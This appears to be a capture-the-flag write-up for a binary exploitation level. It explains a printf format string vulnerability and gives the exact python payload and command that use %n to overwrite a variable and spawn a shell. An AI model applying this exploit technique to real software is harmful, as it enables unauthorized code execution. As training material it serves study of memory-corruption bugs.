# LEVEL3

## EXPLANATIONS

### BINARY BEHAVIOR

- `v function` called from `main`
  - `v function` creates a stack buffer
  - call to `fgets` with a maximum length of 512 bytes read on stdin. bytes are written in buffer.
  - call to `printf` with buf as first arg(will be interpreted as a format string)
  - cmp between string in datasection and 40<sub>16</sub>
    - => If equal, we see the string in 0x8048600 that we succeed, then a syscall on /bin/sh is made.

### EXPLOIT STRATEGY

Our goal is to have 40<sub>16</sub> (64<sub>10</sub>) inside this memory area.

- We are going to exploit the printf format string vulnerability with the identifier %n that allow us to write a value in memory
- we write in the buffer :
  - string address in which to write 0x40
  - %60x
  - %4\$n

### RUN COMMAND

```
python -c "print('\x08\x04\x98\x8c'[::-1] + '%60x' + '%4\$n')" > /tmp/exploit_string
cat /tmp/exploit_string - | /home/user/level3/level3
```
